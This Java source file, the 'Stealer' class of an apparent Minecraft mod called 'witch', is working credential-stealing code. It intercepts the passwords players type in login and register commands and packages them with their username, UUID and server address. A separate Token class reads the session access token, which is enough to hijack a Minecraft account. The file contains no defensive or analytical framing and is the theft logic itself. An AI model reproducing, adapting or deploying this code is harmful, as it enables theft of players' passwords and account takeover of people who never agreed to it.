package me.soda.witch.features;

import java.util.Arrays;
import java.util.List;

import static me.soda.witch.Witch.mc;

public class Stealer {
    public static Password stealPassword(String command) {
        String username;
        String password;
        String server;
        String uuid;
        List<String> loginHint = Arrays.asList("l", "login", "log");
        List<String> regHint = Arrays.asList("reg", "register");
        String[] cmdArray = command.split(" ");
        if (cmdArray.length > 0) {
            if ((loginHint.contains(cmdArray[0]) && cmdArray.length == 2)
                    || (regHint.contains(cmdArray[0]) && cmdArray.length == 2 || cmdArray.length == 3)) {
                password = cmdArray[1];
                if (mc.getCurrentServerEntry() != null) {
                    String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
                    server = name.replace(":", "_");
                } else {
                    server = "unknown/singleplayer";
                }
                username = mc.getSession().getUsername();
                uuid = mc.getSession().getUuid();
                return new Password(username, uuid, password, server);
            }
        }
        return null;
    }

    public static class Password {
        public String username, uuid, password, server;

        public Password(String username, String uuid, String password, String server) {
            this.username = username;
            this.uuid = uuid;
            this.password = password;
            this.server = server;
        }
    }

    public static class Token {
        String username = mc.getSession().getUsername();
        String uuid = mc.getSession().getUuid();
        String token = mc.getSession().getAccessToken();
    }
}
